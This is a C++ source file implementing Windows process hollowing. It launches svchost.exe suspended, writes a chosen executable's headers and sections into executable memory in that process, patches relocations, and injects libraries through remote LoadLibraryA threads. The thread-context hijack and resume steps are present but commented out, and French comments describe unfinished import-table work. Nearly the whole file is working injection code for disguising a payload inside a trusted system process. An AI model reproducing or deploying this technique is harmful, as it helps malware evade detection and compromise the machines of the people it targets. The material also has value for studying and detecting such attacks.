// process-hollowing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#pragma once
#define DEBUG
#include "ProcessHollowingPE.h"
#include <tlhelp32.h>
#include <psapi.h>


bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent)
{
	HANDLE hPe = NULL;
	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hPe == INVALID_HANDLE_VALUE || !hPe)
	{
#ifdef DEBUG
		printf("[-] Error PE to load does not exist\r\n");
		return FALSE;
#endif
	}
	DWORD peSize = GetFileSize(hPe, NULL);

#ifdef DEBUG
	printf("[+] DLL %s loaded\r\n", peName);
	printf("[+] DLL size: %lu bytes \r\n", peSize);
#endif

	peContent = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, peSize);
	if (peContent == NULL)
	{
#ifdef DEBUG
		printf("[-] ERROR in allocating in HEAP\r\n");
#endif
		return FALSE;
	}
	if (!ReadFile(hPe, peContent, peSize, NULL, NULL))
	{
#ifdef DEBUG
		printf("[-] ERROR copying Dll in HEAP \r\n");
#endif
		return FALSE;
	}
#ifdef DEBUG
	printf("[+] Allocating size of Dll on the HEAP @ 0x%p\r\n", peContent);
#endif
	if (!CloseHandle(hPe))
	{
#ifdef DEBUG
		printf("[-] ERROR in closing Handle on file %s", peName);
#endif
		return FALSE;
	}
	return TRUE;
}

bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi)
{

	LPSTARTUPINFOA si = new STARTUPINFOA();
	if (!CreateProcessA(processName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi))
	{
		printf("[-] ERROR: Cannot create process %s", processName);
		return FALSE;
	}
	printf("[+] Launching process %s\r\n", processName);
	return TRUE;
}

bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
{
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
	{
#ifdef DEBUG
		printf("[-] ERROR: Input file seems to not be a PE\r\n");
#endif
		return FALSE;
	}
	ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);

#ifdef DEBUG
	printf("[+] Dos Header: 0x%x\r\n", dosHeaders->e_magic);
	printf("[+] NT headers: 0x%p\r\n", ntHeaders);
#endif

	return TRUE;

}

bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, PIMAGE_NT_HEADERS64 peInjectNtHeaders, PIMAGE_SECTION_HEADER& peToInjectRelocSection)
{

	peInjectNtHeaders->OptionalHeader.ImageBase = (DWORD64)allocAddrOnTarget;
	printf("[+] Writing Header into target process\r\n");
	if (!WriteProcessMemory(pHandle, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders->OptionalHeader.SizeOfHeaders, NULL))
	{
		printf("[-] ERROR: Cannot write headers inside the target process. ERROR Code: %x\r\n", GetLastError());
		return FALSE;
	}
	printf("\t[+] Headers write at : 0x%p\n", allocAddrOnTarget);

	printf("[+] Writing section into target process\r\n");


	for (int i = 0; i < peInjectNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER currentSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)peInjectNtHeaders + 4 + sizeof(IMAGE_FILE_HEADER) + peInjectNtHeaders->FileHeader.SizeOfOptionalHeader + (i * sizeof(IMAGE_SECTION_HEADER)));

		if (!strcmp((char*)currentSectionHeader->Name, ".reloc"))
		{
			peToInjectRelocSection = currentSectionHeader;
			printf("\t[+] Reloc table found 0x%p offset\r\n", (LPVOID)(UINT64)currentSectionHeader->VirtualAddress);
		}

		if (!WriteProcessMemory(pHandle, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress), (LPVOID)((UINT64)peToInjectContent + currentSectionHeader->PointerToRawData), currentSectionHeader->SizeOfRawData, nullptr))
		{
			printf("[-] ERROR: Cannot write section %s in the target process. ERROR Code: %x\r\n", (char*)currentSectionHeader->Name, GetLastError());
			return FALSE;
		}
		printf("\t[+] Section %s written at : 0x%p.\n", (LPSTR)currentSectionHeader->Name, (LPVOID)((UINT64)allocAddrOnTarget + currentSectionHeader->VirtualAddress));

	}
	return TRUE;
}

bool fixRelocTable(HANDLE pHandle, PIMAGE_SECTION_HEADER peToInjectRelocSection, LPVOID& allocAddrOnTarget, LPVOID peToInjectContent, DWORD64 DeltaImageBase, IMAGE_DATA_DIRECTORY relocationTable)
{
	printf("[+] Fixing relocation table.\n");
	if (peToInjectRelocSection == NULL)
	{
		printf("No Reloc Table\r\n");
		return FALSE;
	}

	DWORD RelocOffset = 0;
	while (RelocOffset < relocationTable.Size)
	{
		const auto currentReloc = (PIMAGE_BASE_RELOCATION)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
		RelocOffset += sizeof(IMAGE_BASE_RELOCATION);
		const DWORD NumberOfEntries = (currentReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		for (DWORD i = 0; i < NumberOfEntries; i++)
		{
			const auto currentRelocEntry = (PBASE_RELOCATION_ENTRY)((DWORD64)peToInjectContent + peToInjectRelocSection->PointerToRawData + RelocOffset);
			RelocOffset += sizeof(BASE_RELOCATION_ENTRY);

			if (currentRelocEntry->Type == 0)
				continue;

			const DWORD64 AddressLocation = (DWORD64)allocAddrOnTarget + currentReloc->VirtualAddress + currentRelocEntry->Offset;
			DWORD64 PatchedAddress = 0;

			if (!ReadProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
			{
				printf("[-] ERROR: Cannot read target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
				return FALSE;
			}
			printf("\t[+] Address To Patch: %p -> Address Patched: %p \r\n", (VOID*)PatchedAddress, (VOID*)(PatchedAddress + DeltaImageBase));

			PatchedAddress += DeltaImageBase;

			if (!WriteProcessMemory(pHandle, (LPVOID)AddressLocation, &PatchedAddress, sizeof(DWORD64), nullptr))
			{
				printf("[-] ERROR: Cannot write into target process memory at %p, ERROR CODE: %x\r\n", (LPVOID)((UINT64)AddressLocation), GetLastError());
				return FALSE;
			}
		}
	}
	return TRUE;
}

int listModulesOfProcess(int pid) {

	HANDLE mod;
	MODULEENTRY32 me32;

	mod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
	if (mod == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot error :(\n");
		return -1;
	}

	me32.dwSize = sizeof(MODULEENTRY32);
	if (!Module32First(mod, &me32)) {
		CloseHandle(mod);
		return -1;
	}

	printf("modules found:\n");
	printf("name\t\t\t base address\t\t\tsize\n");
	printf("=================================================================================\n");
	do {
		printf("%#25ws\t\t%#10llx\t\t%#10d\n", me32.szModule, me32.modBaseAddr, me32.modBaseSize);
	} while (Module32Next(mod, &me32));
	CloseHandle(mod);
	return 0;
}


bool fixIAT(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, HANDLE pHandle)
{
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (PBYTE)pImage);

#ifdef DEBUG
	printf("[*] Get Import Directory Table at %p\r\n", importDescriptor);
#endif

	LPCSTR libName = NULL;
	HMODULE lib = NULL;

	while (importDescriptor->Name != NULL)
	{
		libName = (LPCSTR)(importDescriptor->Name + (DWORD_PTR)pImage);

#ifdef DEBUG
		printf("[*] library to load: %s\r\n", libName);
		LPVOID addr = VirtualAllocEx(pHandle, (LPVOID)libName, strlen(libName) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		WriteProcessMemory(pHandle, addr, libName, strlen(libName) + 1, NULL);
		PVOID loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
		CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, addr, 0, NULL);

		/*
		* à ce niveau là il faut faire du load library en remote de toutes les libs dans un premier temps
		* Récupérer les addresses des libs https://cocomelonc.github.io/malware/2023/09/25/malware-trick-36.html
		* Load en local toutes les libs nécessaire, résolve les adresses avec getprocadress et récup l'offset des fonctions.
		* Réécrire l'IAT
		*/
#endif
		importDescriptor++;
	}
	return TRUE;

}

int main()
{



	// create destination process - this is the process to be hollowed out
	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	LPCSTR peInject = "C:\\Users\\user\\source\\repos\\Test\\x64\\Release\\Test.exe";
	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";

	LPVOID peToInjectContent = NULL;
	if (!loadPEFromDisk(peInject, peToInjectContent))
		exit(1);


	if (!launchSusprendedProcess((LPSTR)target, pi))
		exit(1);



	if (!retrieveNtHeaders(peInjectNtHeaders, peToInjectContent))
		exit(1);

	LPVOID allocAddrOnTarget = NULL;
	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL, peInjectNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	const DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;

	if (allocAddrOnTarget == NULL)
	{
		printf("[-] ERROR: Failed to allocate memory on target process\r\n");
		exit(1);
	}

	printf("[+] Memory allocate at : 0x%p\n", allocAddrOnTarget);

	IMAGE_DATA_DIRECTORY relocationTable = peInjectNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;

	if (!copyPEinTargetProcess(pi->hProcess, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders, peToInjectRelocSection))
		exit(1);

	if (!fixRelocTable(pi->hProcess, peToInjectRelocSection, allocAddrOnTarget, peToInjectContent, DeltaImageBase, relocationTable))
		exit(1);

	PBYTE contentOnRemote = new BYTE[12288];
	ReadProcessMemory(pi->hProcess, allocAddrOnTarget, contentOnRemote, 12288, NULL);


	if (!fixIAT(contentOnRemote, peInjectNtHeaders, pi->hProcess))
		exit(1);

	Sleep(3000);

	listModulesOfProcess(pi->dwProcessId);

	/*CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(pi->hThread, &CTX);
	if (!bGetContext)
	{
		printf("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &peInjectNtHeaders->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		printf("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(pi->hThread, &CTX);
	if (!bSetContext)
	{
		printf("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(pi->hThread);*/



	return 0;
}
